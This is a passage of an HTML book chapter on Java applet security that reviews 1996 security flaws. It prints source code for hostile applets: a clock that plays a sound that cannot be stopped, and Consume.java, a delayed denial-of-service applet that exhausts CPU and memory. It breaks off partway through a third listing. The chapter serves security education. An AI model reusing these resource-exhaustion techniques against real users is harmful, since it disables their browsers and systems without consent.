@@ -1,0 +1,2481 @@
+<HTML>
+
+<HEAD>
+   <TITLE>Chapter 23 -- Pushing the Limits of Java Security</TITLE>
+   <META NAME="GENERATOR" CONTENT="Mozilla/3.0b5aGold (WinNT; I) [Netscape]">
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#FFFFFF" LINK="#0000EE" VLINK="#551A8B" ALINK="#CE2910">
+
+
+
+
+
+
+
+
+
+
+<H1><FONT COLOR=#FF0000>Chapter 23</FONT></H1>
+<H1><B><FONT SIZE=5 COLOR=#FF0000>Pushing the Limits of Java Security</FONT></B>
+</H1>
+<P>
+<HR WIDTH="100%"></P>
+<P>
+<H3 ALIGN=CENTER><FONT COLOR="#000000"><FONT SIZE=+2>CONTENTS<A NAME="CONTENTS"></A>
+</FONT></FONT></H3>
+
+
+<UL>
+<LI><A HREF="#IntroducingHostileApplets" >Introducing Hostile Applets</A>
+<LI><A HREF="#ChallengesfortheHacker" >Challenges for the Hacker</A>
+<LI><A HREF="#AVeryNoisyBear" >A Very Noisy Bear</A>
+<LI><A HREF="#AGluttonousTrio" >A Gluttonous Trio</A>
+<LI><A HREF="#ThrowOpenaWindow" >Throw Open a Window</A>
+<LI><A HREF="#SurvivaloftheFittestAppletStyle" >Survival of the Fittest, Applet Style</A>
+<LI><A HREF="#PortWhereAreYou" >Port 25, Where Are You?</A>
+<LI><A HREF="#AJavaFactoringByWebProject" >A Java Factoring-By-Web Project</A>
+<LI><A HREF="#Summary" >Summary</A>
+</UL>
+<HR>
+<H2><A NAME="IntroducingHostileApplets"><B><FONT SIZE=5 COLOR=#FF0000>Introducing
+Hostile Applets</FONT></B></A></H2>
+<P>
+The preceding chapters have examined the Java Security Model and
+the Java Security Manager from a responsible programmer's perspective.
+These chapters addressed the important issues of understanding
+and assessing risks, creating a security policy, and implementing
+trusted applet authentication procedures.
+<P>
+This chapter takes a different approach, employing instead a hacker's-eye-view
+of Java and introducing the subject of <I>hostile applets</I>.
+<P>
+A hostile applet is any applet which, when downloaded, attempts
+to monopolize or exploit your system's resources in an inappropriate
+manner.
+<P>
+An applet which performs, or causes you to perform, an action
+which you would not otherwise care to perform should be deemed
+hostile. Denial-of-service applets, mail forging applets, and
+applets that surreptitiously run other people's programs on your
+workstation are all clear-cut examples of hostile applets, but
+the definition is still problematic. Is an applet which annoys
+you, perhaps on account of some programming error, to be regarded
+as hostile?
+<P>
+Is an applet hostile just because you don't approve of its effects?
+Have you tacitly consented to every possible effect by virtue
+of using a Java-enabled browser? These are just a few of the thorny
+issues waiting to be resolved by the Java community.
+<P>
+Taking an adversarial approach, this chapter uses the power of
+the Java language to probe for weaknesses. The goal in presenting
+examples of hostile applets is not simply to annoy and harass
+Web surfers for the sport of it, though clearly that is one potential
+side effect. Rather, the goal is to illustrate, by means of concrete
+examples, some serious issues.
+<P>
+It might be argued that by revealing the source code for such
+unfriendly applets and by explaining the ideas that we used to
+construct them, we are providing effective training for aspiring
+hackers. But attempting to keep potential security problems secret
+has never been an effective method for improving security. While
+hackers might learn a useful trick or two here, it seems much
+more likely that both system administrators and ordinary users
+will benefit more from a frank introduction to potential problems.
+Raising awareness will ultimately strengthen both Java and Internet
+security.
+<H2><A NAME="ChallengesfortheHacker"><B><FONT SIZE=5 COLOR=#FF0000>Challenges
+for the Hacker</FONT></B></A></H2>
+<P>
+Sun's web page, &quot;Frequently Asked Questions-Applet Security&quot;
+(<TT><A HREF="http://java.sun.com/sfaq/index.html">http://java.sun.com/sfaq/index.html</A></TT>),
+introduces most of the important activities that Java applets
+are not allowed to perform. Sun's stated goals are to prevent
+applets from &quot;inspecting or changing files on a client file
+system&quot; and &quot;using network connections to circumvent
+file protections or people's expectations of privacy.&quot; Of
+particular interest is Sun's summary of applet capabilities and
+the accompanying examples. The challenge for the hacker is to
+replace &quot;no&quot; (applets can't do that) with &quot;yes&quot;
+(sure they can!) as many times as possible. As Sun's examples
+show, you cannot expect a straightforward approach to challenging
+Java security to work. Nevertheless, several security bugs have
+already been discovered, and it is possible to expose others by
+exploiting the language in unexpected ways.
+<P>
+Recently, security flaws were found in both the 1.0 release of
+the Java Developer's Kit (JDK) and the 2.0 version of Netscape's
+Navigator. In February 1996 Drew Dean, Ed Felten, and Dan Wallach
+of Princeton University announced their successful &quot;DNS Attack
+Scenario.&quot;
+<P>
+Under this scenario an applet could establish a network connection
+to an arbitrary host. The key to their scenario's success was
+the Java applet security manager's performing dynamic DNS lookups.
+Instead of determining an applet's numerical IP address as it
+was downloaded and enabling it to connect only to that address,
+the applet security manager would allow it to connect to any IP
+address associated with the host name from which it came. As a
+result, the security manager was actually enforcing a rule much
+weaker than what Sun claimed. A purveyor of hostile applets, running
+his own domain name resolver, could then advertise a false IP
+address and have his applets open network connections to that
+address, thereby circumventing one of Java's intended rules.
+<P>
+While Dean, Felten, and Wallach never publicly released their
+hostile applet (which they said exploited an old sendmail bug
+to make their point), the potential for mischief was recognized
+at once. In their initial public report (<TT><A HREF="http://www.cs.princeton.edu/~ddean/java/">http://www.cs.princeton.edu/~ddean/java/</A></TT>)
+the Princeton researchers outlined how an applet could make connections
+behind firewalls, employ SATAN, and spread Web viruses. Within
+days Netscape Communications had issued a patch to the 2.0 version
+of their Navigator, and on March 5 CERT issued an advisory (<TT><A HREF="ftp://cert.org/pub/cert_advisories/CA-96.05.java_applet_security_mgr">ftp://cert.org/pub/cert_advisories/CA-96.05.java_applet_security_mgr</A></TT>).
+<P>
+Both Netscape 2.01 and JDK 1.0.1 have fixed this security flaw.
+<P>
+A second serious flaw also existed in JDK 1.0 and Netscape 2.0.
+This one, discovered by David Hopwood (<TT><A HREF="http://sable.ox.uk/~lady0065/java/bugs/tech.html">http://sable.ox.uk/~lady0065/java/bugs/tech.html</A></TT>)
+involved the classloader. By deliberately modifying a class file,
+or modifying the Java compiler to produce such an altered class
+file, it was possible to invoke a class name beginning with either
+&quot;<TT>/</TT>&quot; or &quot;<TT>\</TT>.&quot;
+As the compiler, <TT>javac</TT>, cannot
+produce such a class reference, the classloader should have rejected
+any class file that sought to do this.
+<P>
+But in fact these altered class files could pass through the classladder
+undetected. An applet could bypass the Java security manager,
+refer to files by their absolute path names, and load native code
+libraries.
+<P>
+Once again the hostile applet was not publicly displayed, and
+this security bug was corrected in both Netscape 2.01 and JDK
+1.0.1.
+<P>
+More recently, in late March 1996, another serious security breach
+was revealed. This one has been reported by the Princeton team
+of Dean, Felten, and Wallach, and it involves the Java bytecode
+verifier.
+<P>
+Through another flaw in the implementation of the Java security
+model, still present in JDK 1.0.1 and Netscape 2.01, it is possible
+for an applet to execute through the browser any command that
+the user is able to execute on the system. In particular, a cleverly
+designed hostile applet can read, modify, and delete files at
+will. CERT has issued a timely advisory (<TT><A HREF="ftp://cert.org/pub/cert_advisories/CA-96.07.java_bytecode_verifier">ftp://cert.org/pub/cert_advisories/CA-96.07.java_bytecode_verifier</A></TT>),
+and this problem was corrected in both Netscape 2.02 and JDK 1.0.2.
+ Details of this and other attacks by the Princeton team are available
+in their recent paper, &quot;Java Security: From HotJava to Netscape
+and Beyond&quot; (<TT><A HREF="http://www.cs.princeton.edu/sip/pub/secure96.html">http://www.cs.princeton.edu/sip/pub/secure96.html</A></TT>).
+<P>
+The same authors have an informative Web page, &quot;Java Security:
+Frequently Asked Questions&quot; (<TT><A HREF="http://www.cs.princeton.edu/sip/java-faq.html">http://www.cs.princeton.edu/sip/java-faq.html</A></TT>).
+Another excellent source of information on recent security bugs
+in Java is David Hopwood's Web page, &quot;Security Bugs in Java&quot;
+<BR>
+(<TT><A HREF="http://ferret.lmh.ox.ac.uk/~david/java/">http://ferret.lmh.ox.ac.uk/~david/java/</A></TT>).
+ Both of these sites offer advice on the best ways to deal with
+Java security problems, and Sun's Web page, &quot;Frequently Asked
+Questions - Applet Security&quot; (<TT><A HREF="http://java.sun.com/sfaq/">http://java.sun.com/sfaq/</A></TT>),
+is frequently revised to provide news about the latest developments.
+ As more security problems are discovered, these sites are sure
+to continue offering timely and accurate information and advice.
+<P>
+The ongoing research at Princeton and Oxford has shown the potentially
+deleterious effects of hostile applets. So far these applets have
+only appeared under controlled conditions and have not been set
+loose to wreak havoc on the Web, but other sorts of hostile applets
+do exist, are easily written, and are readily available on the
+Web. One collection has already appeared on the &quot;Hostile
+Applets Home Page&quot; (<TT><A HREF="http://www.math.gatech.edu/~mladue/HostileApplets.html">http://www.math.gatech.edu/~mladue/HostileApplets.html</A></TT>),
+and DigiCrime (<TT><A HREF="http://www.digicrime.com/">http://www.digicrime.com/</A></TT>)
+has promised that more are on the way. While the hostile applets
+that are publicly available may pale in comparison to their Ivy
+League cousins, their potential for mischief should not be underestimated.
+The rest of this chapter discusses concrete examples of applets
+that can
+<OL>
+<LI>Annoy you with a very noisy bear who refuses to be quiet
+<LI>Bring your browser to a grinding halt
+<LI>Make your browser start barking and then exit
+<LI>Attack your workstation with big windows, wasteful calculations,
+and more noise, effectively excluding you from the console
+<LI>Pop up an untrusted applet window minus the warning and ask
+you for a login and password
+<LI>Kill all other applets and defend themselves from ThreadDeath
+<LI>Forge electronic mail
+<LI>Obtain your user name
+<LI>Exploit your workstation to run someone else's program and
+report back the results
+</OL>
+<P>
+<P><CENTER><TABLE BORDERCOLOR=#000000 BORDER=1 WIDTH=80%>
+<TR><TD><B>Note</B></TD></TR>
+<TR><TD>
+<BLOCKQUOTE>
+The examples discussed in this chapter and included on the accompanying CD were developed and tested on a Sun Sparcstation 5 running Solaris 2.5 and OpenWindows 3.5. They have also been tested on a DEC Alpha running Digital UNIX V3.2C. Their effectiveness 
+under Windows 95 and MacOS varies from machine to machine. They are equally effective when viewed by Netscape's Navigator (2.01, 2.02, and 3.0b), by Sun's HotJava 1.0 (preBeta1) browser, and by the humble JDK appletviewer. While these examples are somewhat 
+inelegant hacks, they do serve to illustrate various issues that need to be addressed in the Java community.</BLOCKQUOTE>
+
+</TD></TR>
+</TABLE></CENTER>
+<P>
+<H2><A NAME="AVeryNoisyBear"><B><FONT SIZE=5 COLOR=#FF0000>A Very
+Noisy Bear</FONT></B></A></H2>
+<P>
+Writing a clock applet has become a virtual rite of passage for
+the would-be Java programmer. So it seems appropriate that this
+chapter's first applet should be a clock applet that goes awry.
+Listing 23.1 displays the applet NoisyBear.java.
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.1. NoisyBear.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>import java.applet.AudioClip;<BR>
+import java.awt.*;<BR>
+import java.util.Date;<BR>
+<BR>
+public class NoisyBear extends java.applet.Applet implements Runnable
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Font timeFont = new Font(&quot;TimesRoman&quot;,
+Font.BOLD, 24);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Font
+wordFont = new Font(&quot;TimesRoman&quot;, Font.PLAIN, 12);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Date rightNow;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Thread
+announce = null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Image bearImage;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Image
+offscreenImage;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Graphics offscreenGraphics;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;AudioClip
+annoy;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;boolean threadStopped = false;<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void init() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;bearImage
+= getImage(getCodeBase(), &quot;Pictures/sunbear.jpg&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;offscreenImage = createImage(this.size().width,
+this.size().height);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;offscreenGraphics
+= offscreenImage.getGraphics();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;annoy = getAudioClip(getCodeBase(), &quot;Sounds/drum.au&quot;);
+<BR>
+}<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void start() {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (announce ==
+null) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;announce
+= new Thread(this);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;announce.start();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void stop() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(announce != null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//if (annoy !=
+null) annoy.stop();&nbsp;&nbsp;//uncommenting stops the noise
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;announce.stop();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;announce = null;
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void run() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(annoy != null) annoy.loop();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while (true) {
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rightNow
+= new Date();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;repaint();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{ Thread.sleep(1000); }<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch (InterruptedException
+e) {}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void update(Graphics g) {<BR>
+//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;g.clipRect(125,
+150, 350, 50);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;paint(g);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void paint(Graphics g) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int imwidth =
+bearImage.getWidth(this);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int
+imheight = bearImage.getHeight(this);<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;
+offscreenGraphics.drawImage(bearImage, 0, 0, imwidth, imheight,
+this);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; offscreenGraphics.setColor(Color.white);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;
+offscreenGraphics.fillRect(125, 150, 350, 100);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; offscreenGraphics.setColor(Color.blue);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;
+offscreenGraphics.drawRect(124, 149, 352, 102);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; offscreenGraphics.setFont(timeFont);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;
+offscreenGraphics.drawString(rightNow.toString(), 135, 200);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; offscreenGraphics.setFont(wordFont);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;
+offscreenGraphics.drawString(&quot;It's time for me to annoy you!&quot;,
+135, 225);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; g.drawImage(offscreenImage, 0, 0, this);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+boolean mouseDown(Event evt, int x, int y) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (threadStopped)
+{<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;announce.resume();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;announce.suspend();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;threadStopped
+= !threadStopped;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return
+true;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<P>
+The applet is friendly for the most part. It uses double buffering
+to smoothly superimpose a simple clock over the bear's image and
+update the clock. The applet's <TT>stop()</TT>
+method enables you to stop and restart the clock by clicking on
+it. But notice that this does not stop the sound.
+<P>
+Now journey to another Web page, and the sound continues. To escape
+from this very noisy bear, you have to kill the thread running
+<TT>annoy.loop()</TT>, disable your
+audio, or quit the browser, all of which are inconvenient. Therein
+lies the hostile feature of the applet.
+<P>
+Now look at the <TT>stop()</TT> method
+in NoisyBear.java, and observe that the line which would silence
+the Noisy Bear has been commented out. By doing so, a harmless,
+if somewhat inane, clock applet changes into a hostile applet.
+A powerful and useful feature of Java, the ability to play sound
+in the background, has been subverted. In this case the commented
+line in the <TT>stop()</TT> method
+was left to illustrate the point. Uncomment the line and compile
+the applet again, and the Noisy Bear becomes well-behaved.
+<P>
+This simple example offers several lessons. First, just as <TT>annoy.loop()</TT>
+continued ad nauseum, so can any other thread. The Java programmer
+is not obliged to stop an applet's threads, and can even override
+the <TT>stop()</TT> method to do absolutely
+nothing. Thus threads may run in the Web browser as ghosts of
+departed applets. You will see that this is the key to building
+hostile applets. A second observation concerns the use of offscreen
+graphics objects. While they certainly help to improve the quality
+of animation, they can be gluttonous consumers of resources. The
+next two sections show how animations can provide safe havens
+for denial-of-service applets.
+<P>
+From a casual encounter with the Noisy Bear, it would be hard
+to tell-was there hostile intent, or just bad programming? In
+the rest of the examples in this chapter the answer is very clear.
+<H2><A NAME="AGluttonousTrio"><B><FONT SIZE=5 COLOR=#FF0000>A
+Gluttonous Trio</FONT></B></A></H2>
+<P>
+Following the observations about NoisyBear.java, you are now ready
+to look at a trio of hostile applets. The first two are designed
+to monopolize your system's resources to such an extent that your
+browser comes to a grinding halt. The third one makes your browser
+start barking before it dies from a bus error. Listing 23.2 shows
+the first applet of the trio, Consume.java.
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.2. Consume.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>import java.awt.Color;<BR>
+import java.awt.Event;<BR>
+import java.awt.Font;<BR>
+import java.awt.Graphics;<BR>
+import java.awt.Image;<BR>
+<BR>
+public class Consume extends java.applet.Applet implements Runnable
+{<BR>
+<BR>
+//&nbsp;&nbsp;Just a font to paint strings to our offscreen object
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Font wordFont = new Font(&quot;TimesRoman&quot;,
+Font.PLAIN, 12);<BR>
+<BR>
+//&nbsp;&nbsp;This thread will attempt to consume resources<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Thread
+wasteResources = null;<BR>
+<BR>
+//&nbsp;&nbsp;An offscreen Image where all of the real action
+will occur<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Image offscreenImage;<BR>
+<BR>
+//&nbsp;&nbsp;All of the tools necessary to handle the offscreen
+Image<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Graphics
+offscreenGraphics;&nbsp;&nbsp;// Needed to handle the offscreen
+Image<BR>
+<BR>
+//&nbsp;&nbsp;To avoid arrays and have open-ended storage of results
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;StringBuffer holdBigNumbers = new StringBuffer(0);
+<BR>
+<BR>
+//&nbsp;&nbsp;Used for the while loop in the run() method<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;long
+n = 0;<BR>
+<BR>
+//&nbsp;&nbsp;Used to read in a parameter that makes the thread
+sleep for a<BR>
+//&nbsp;&nbsp;specified number of seconds<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;int
+delay;<BR>
+<BR>
+<BR>
+/*&nbsp;&nbsp;Set up a big blue rectangle in the browser and create
+an offscreen Image */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void init() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;setBackground(Color.blue);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;offscreenImage = createImage(this.size().width,
+this.size().height);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;offscreenGraphics
+= offscreenImage.getGraphics();<BR>
+<BR>
+//&nbsp;&nbsp;Determine how many seconds the thread should sleep
+before kicking in<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;String str = getParameter(&quot;wait&quot;);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;if
+(str == null)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delay = 0;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;else
+delay = (1000)*(Integer.parseInt(str));<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+/*&nbsp;&nbsp;Create and start the offending thread in the standard
+way */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void start() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(wasteResources == null) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources
+= new Thread(this);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources.setPriority(Thread.MAX_PRIORITY);
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wasteResources.start();
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+/*&nbsp;&nbsp;We won't stop anything */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void stop() {}<BR>
+<BR>
+<BR>
+/*<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;This method repeatedly appends a very
+large integer to<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;a
+StringBuffer. It can sleep for a specified length<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;of time in order to give the browser enough
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;time
+to go elsewhere before its insidious effects<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;become apparent. */<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;public void run() {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{Thread.sleep(delay);}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch (InterruptedException
+e) {}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while
+(n &gt;= 0) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try { holdBigNumbers.append(0x7fffffffffffffffL);
+}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(OutOfMemoryError o) {}<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;repaint();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n++;
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void update(Graphics g) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;paint(g);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+/*&nbsp;&nbsp;Paints to the offscreen Image */<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void paint(Graphics g) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;offscreenGraphics.setColor(Color.white);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;offscreenGraphics.drawRect(0,
+0, this.size().width, this.size().height);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;offscreenGraphics.setColor(Color.blue);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;offscreenGraphics.drawString(holdBigNumbers.toString(),
+10, 50);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<P>
+The applet, when downloaded, appears to be completely inert-it
+simply displays a blue rectangle in your browser. The real action
+takes place in a thread. The <TT>init()</TT>
+method creates offscreen Image and Graphics objects and reads
+in a parameter that specifies how long the hostile thread should
+sleep before going to work. While <TT>start()</TT>
+creates this thread,<TT> stop()</TT>
+does absolutely nothing to control it. The applet's <TT>run()</TT>
+method first allows the thread to sleep for the desired length
+of time, then the hostile activity occurs in a <TT>while</TT>
+loop. Here the maximum 64-bit signed integer is repeatedly appended
+to a StringBuffer, and the result is displayed offscreen. This
+quickly overwhelms the browser with useless activity.
+<P>
+Several aspects of this hostile applet are worth noting:
+<OL>
+<LI>It runs in a thread in the browser, and its hostile activities
+take place out of sight.
+<LI>Its <TT>stop()</TT> method does
+nothing.
+<LI>It has a parameter that makes the hostile thread sleep for
+a specified amount of time. This allows the browser to go elsewhere
+before the hostile effects become apparent, so that the origin
+of the effects can be obscured.
+</OL>
+<P>
+Consume.java brings your browser to a halt by monopolizing both
+CPU and memory, but monopolizing either suffices to hang your
+browser. Almost any expensive numerical routine could be used
+in place of appending large integers to a StringBuffer. Raising
+a large matrix to a high power, trying to factor large integers,
+and calculating the digits of pi would all have this effect if
+done with an eye toward inefficiency, and you can no doubt think
+of dozens more. As an example, Listing 23.3 displays the second
+member of the trio, Wasteful.java, which calculates the Fibonacci
+sequence recursively, consuming CPU and halting the browser.<BR>
+<BLOCKQUOTE>
+<B>Listing 23.3. Wasteful.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>import java.awt.Color;<BR>
+import java.awt.Event;<BR>
+import java.awt.Font;<BR>
+import java.awt.Graphics;<BR>
+import java.awt.Image;<BR>
+<BR>
+public class Wasteful extends java.applet.Applet implements Runnable
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Font wordFont = new Font(&quot;TimesRoman&quot;,
+Font.PLAIN, 12);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Thread
+wasteResources = null;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;Image offscreenImage;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;Graphics
+offscreenGraphics;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;boolean threadStopped = false;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;StringBuffer
+holdResults = new StringBuffer(0);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;long n = 0;<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;int
+delay;<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+void init() {<BR>
